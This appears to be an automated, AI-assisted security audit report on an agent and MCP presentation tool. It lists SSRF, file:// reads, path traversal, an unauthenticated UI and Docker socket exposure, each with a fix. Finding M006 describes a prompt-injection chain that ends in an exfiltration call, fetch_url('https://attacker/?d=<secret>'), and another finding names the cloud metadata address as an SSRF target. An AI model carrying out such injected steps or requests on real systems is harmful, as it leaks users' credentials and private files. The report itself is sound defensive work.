# Agent & MCP security report

Scanned: `/tmp/blind/c11` · 2026-11-23T20:53:45+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 0 | 9 | 5 | 3 | 0 | 12 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **32** · agent/MCP code files: **23** · agent instruction files: **2**
- Frameworks seen: FastMCP, mcp, modelcontextprotocol, openai

## Findings

### M001 · HIGH · fetch_url reads local files through Chromium (file:// URLs)
`None:None` · ASI02 Tool Misuse and Exploitation

No scheme check: url='file:///path/to/config.yaml' fails in httpx (exception swallowed), then Chromium opens the local file and its text is returned to the model - arbitrary file read on the host container, outside the sandbox.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:256` — `async with PlaywrightConverter() as converter:`
> `deeppresenter/tools/search.py:261` — `html = await converter.page.content()`

**Fix:** Reject any scheme other than http/https before calling httpx or Playwright.

### M002 · HIGH · convert_to_markdown reads any host file into the workspace
`None:None` · ASI02 Tool Misuse and Exploitation

file_path is any path; its text is converted and written to an output .md the sandbox agent can read (e.g. file_path=config.yaml, output_folder inside the workspace), so host secrets reach the model.
> `deeppresenter/tools/any2markdown.py:38` — `async def convert_to_markdown(file_path: str, output_folder: str) -> dict:`
> `deeppresenter/tools/any2markdown.py:70` — `conver_result = MarkItDown().convert_local(file_path, keep_data_uris=True)`
> `deeppresenter/tools/any2markdown.py:83` — `f.write(markdown)`

**Fix:** Resolve file_path and require is_relative_to(workspace) (attachments are copied there already).

### M004 · HIGH · Web UI published on 0.0.0.0:7861 without authentication
`None:None` · ASI03 Identity and Privilege Abuse

The Docker image starts Gradio on all interfaces and compose publishes the port; launch() has no auth, so anyone who reaches the port can drive the agent (LLM spend, sandbox shell, and the host file-read tools above, including other users' workspaces).
> `deeppresenter/docker/Host.Dockerfile:78` — `python webui.py 0.0.0.0`
> `docker-compose.yml:13` — `- "7861:7861"`
> `webui.py:433` — `demo.launch(`

**Fix:** Bind to 127.0.0.1 in the compose port mapping or pass auth=... to demo.launch; put it behind an authenticating proxy.

### M005 · HIGH · Docker socket mounted into the web-facing host container
`None:None` · ASI03 Identity and Privilege Abuse

The container that runs the unauthenticated web UI and the unsandboxed host tools holds the Docker socket, which is root on the host; any code execution in it (or a future tool bug) becomes full host compromise.
> `docker-compose.yml:22` — `- /var/run/docker.sock:/var/run/docker.sock`

**Fix:** Use a restricted Docker API proxy (allow only container create/run of the sandbox image) or a rootless/remote Docker daemon.

### M006 · HIGH · Untrusted web content + host file reads + outbound requests with no approval
`None:None` · ASI01 / ASI02 (untrusted input + private data + way out)

A web page or uploaded document can instruct the agent to read config.yaml via document_summary/fetch_url(file://) and then call fetch_url('https://attacker/?d=<secret>'); nothing asks a human in between.
> `deeppresenter/tools/search.py:261` — `html = await converter.page.content()`
> `deeppresenter/tools/tool_agents.py:144` — `with open(document_path, encoding="utf-8") as f:`
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`

**Fix:** Confine all host tools to the workspace (F009/F020/F021/M001/M002), allowlist outbound hosts or require approval for fetches after private data was read.

### F014 · HIGH · SSRF
`deeppresenter/tools/search.py:237` · ASI02 Tool Misuse and Exploitation

Any URL (no scheme/host allowlist, redirects followed) is fetched by httpx and then loaded in Chromium, and the page text is returned to the model: http://169.254.169.254/ or internal services are readable. httpx errors are swallowed by the except/pass, so Playwright always runs.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:237` — `resp = await client.head(url)`
> `deeppresenter/tools/search.py:259` — `url, wait_until="domcontentloaded", timeout=MCP_CALL_TIMEOUT // 2 * 1000`

**Fix:** Allow only http/https, resolve the host and block private, loopback, link-local and metadata ranges (also after redirects, e.g. via a Playwright route handler).

### F015 · HIGH · SSRF
`deeppresenter/tools/search.py:241` · ASI02 Tool Misuse and Exploitation

Same fetch_url SSRF as F014 (GET fallback path).
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:241` — `resp = await client.get(url, stream=True)`

**Fix:** Same as F014.

### F009 · HIGH · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:52` · ASI02 Tool Misuse and Exploitation

path is unrestricted, so a steered model can overwrite any file the host process can write (config.yaml, the mounted deeppresenter source, other users' workspaces) with image bytes, outside the sandbox. Bytes are not attacker-chosen, so it is destruction rather than code execution.
> `deeppresenter/tools/tool_agents.py:29` — `async def image_generation(prompt: str, width: int, height: int, path: str) -> str:`
> `deeppresenter/tools/tool_agents.py:38` — `Path(path).parent.mkdir(parents=True, exist_ok=True)`
> `deeppresenter/tools/tool_agents.py:52` — `with open(path, "wb") as file:`

**Fix:** Resolve path and require is_relative_to(workspace); refuse existing files outside the workspace.

### F021 · HIGH · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:144` · ASI02 Tool Misuse and Exploitation

Any text file on the host (config.yaml with LLM/API keys, ~/.ssh keys, other users' workspaces) is read and sent to the LLM with an attacker-chosen task such as 'repeat the document verbatim', and the result is returned to the model.
> `deeppresenter/tools/tool_agents.py:127` — `async def document_summary(task: str, document_path: str) -> str:`
> `deeppresenter/tools/tool_agents.py:144` — `with open(document_path, encoding="utf-8") as f:`
> `deeppresenter/tools/tool_agents.py:151` — `"content": f"Task: {task}\nDocument: {document}",`

**Fix:** Resolve document_path and require is_relative_to(workspace) (resolved); keep secrets out of files readable by the tool process.

### M003 · MEDIUM · pptagent-mcp writes table images and pptx files to any path
`None:None` · ASI02 Tool Misuse and Exploitation

Both tools write to an unrestricted path (creating parent dirs), so any file the server can write can be overwritten with an image or a pptx.
> `pptagent/mcp_server.py:127` — `def markdown_table_to_image(markdown_table: str, path: str, css: str) -> str:`
> `pptagent/mcp_server.py:142` — `get_html_table_image(html, path, css)`
> `pptagent/mcp_server.py:288` — `async def save_generated_slides(pptx_path: str):`

**Fix:** Resolve the path and require it inside WORKSPACE; refuse to overwrite files outside it.

### M007 · MEDIUM · Fetched web pages returned raw into the model context
`None:None` · 

fetch_url returns page text straight to the model without marking it as untrusted data, which is how injected instructions reach the agent that also holds the file and network tools.
> `deeppresenter/tools/search.py:267` — `markdown = markdownify.markdownify(html, heading_style=markdownify.ATX)`
> `deeppresenter/tools/search.py:270` — `result = extract(`

**Fix:** Wrap tool output in clear untrusted-data delimiters and tell the system prompt to never follow instructions from it.

### M008 · MEDIUM · Sandbox execute_command with network access and no approval
`None:None` · ASI02 Tool Misuse / ASI05

The agent gets an unrestricted shell (allowedDirectories '/') by design; it is contained in a Docker sandbox with only the workspace mounted, but the container keeps default network access, so it is a ready exfiltration path for anything in the workspace.
> `deeppresenter/docker/server.ts:258` — `name: "execute_command",`
> `deeppresenter/docker/config.json:18` — `"/"`

**Fix:** Run the sandbox with --network none (or an egress allowlist) and keep secrets out of the workspace.

### F003 · MEDIUM · PATH-TRAVERSAL
`deeppresenter/tools/any2markdown.py:82` · ASI02 Tool Misuse and Exploitation

output_folder is any path: the tool creates directories anywhere the host process can write and writes a <stem>.md file (plus images/) there. It runs on the host/host-container, outside the Docker sandbox. Writes are limited to new or empty folders and .md/image files, so medium.
> `deeppresenter/tools/any2markdown.py:38` — `async def convert_to_markdown(file_path: str, output_folder: str) -> dict:`
> `deeppresenter/tools/any2markdown.py:49` — `output_path.mkdir(parents=True, exist_ok=True)`
> `deeppresenter/tools/any2markdown.py:82` — `with open(str(markdown_file), "w", encoding="utf-8") as f:`

**Fix:** Resolve output_folder with Path(...).resolve() and require .is_relative_to(Path(os.environ['WORKSPACE']).resolve()) before mkdir.

### F020 · MEDIUM · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:89` · ASI02 Tool Misuse and Exploitation

Any image file on the host (outside the sandbox and in other users' workspaces) is read and described to the model. Limited to files PIL accepts as images, so medium.
> `deeppresenter/tools/tool_agents.py:75` — `async def image_caption(image_path: str) -> dict:`
> `deeppresenter/tools/tool_agents.py:89` — `with open(image_path, "rb") as f:`

**Fix:** Resolve image_path and require is_relative_to(workspace).

### F013 · LOW · PATH-TRAVERSAL
`deeppresenter/tools/reflect.py:72` · ASI02 Tool Misuse and Exploitation

Any .md file on the host can be opened; the content is not returned, only stats and image-link targets, and the exists() check acts as a file-existence oracle for any path. Low.
> `deeppresenter/tools/reflect.py:62` — `def inspect_manuscript(md_file: str) -> dict:`
> `deeppresenter/tools/reflect.py:69` — `assert md_path.exists(), f"file does not exist: {md_file}"`
> `deeppresenter/tools/reflect.py:72` — `with open(md_file, encoding="utf-8") as f:`

**Fix:** Resolve md_file and require it inside the workspace.

### F010 · LOW · TLS-VERIFY-OFF
`deeppresenter/tools/search.py:299` · 

download_file turns off certificate checks, so a network attacker can swap the downloaded file (it is saved into the workspace and used in slides).
> `deeppresenter/tools/search.py:302` — `verify=False,`

**Fix:** Remove verify=False.

### F008 · LOW · PATH-TRAVERSAL
`deeppresenter/tools/task.py:208` · ASI02 Tool Misuse and Exploitation

For the Research agent, finalize rewrites any existing .md file named by outcome (image links turned into absolute paths, alt text changed), anywhere outside the workspace. Content is not attacker-chosen, so impact is low.
> `deeppresenter/tools/task.py:178` — `def finalize(outcome: str, agent_name: str = "") -> str:`
> `deeppresenter/tools/task.py:208` — `path.write_text(content, encoding="utf-8")`

**Fix:** Resolve outcome and require it to be inside the workspace (Path.resolve().is_relative_to(workspace)) before reading/writing.

## Dismissed as false alarms

- F001 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:64` — Only renames a file the converter just produced inside the output folder, which line 50 requires to be empty. The real problem (output_folder itself is unrestricted) is reported once under F003.
- F002 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:66` — Deletes only .json/.pdf files MinerU just wrote into an output folder that had to be empty (line 50); no pre-existing file can be removed.
- F004 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:113` — str.replace on the markdown text, not a file operation.
- F005 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:120` — File name is a random hex plus an extension checked against an allowlist; it is written under the output folder whose location is the F003 issue.
- F006 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:124` — String replacement in the markdown text, not a file path sink.
- F007 PATH-TRAVERSAL `deeppresenter/tools/task.py:207` — Only copies an existing .md file to a dotfile beside itself; no attacker-controlled content is written. The rewrite of the file is reported in F008.
- F011 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:67` — Reads back the .md file the tool just created in the (required-empty) output folder. The arbitrary read of file_path is reported as M002.
- F012 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:89` — Opens only images the tool itself wrote into output_folder/images.
- F016 PATH-TRAVERSAL `deeppresenter/tools/search.py:308` — Image.open reads in-memory bytes (BytesIO), and output_file is resolved (symlinks followed) then checked to be inside the workspace - a working guard.
- F017 PATH-TRAVERSAL `deeppresenter/tools/task.py:198` — The read content is not returned to the model (finalize returns only the path); the write side is reported in F008.
- F018 SSRF `deeppresenter/tools/tool_agents.py:45` — The URL comes from the configured image-generation API response, not from a tool argument.
- F019 PATH-TRAVERSAL `deeppresenter/tools/tool_agents.py:86` — Only verifies the file is an image; the actual read and disclosure is F020.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
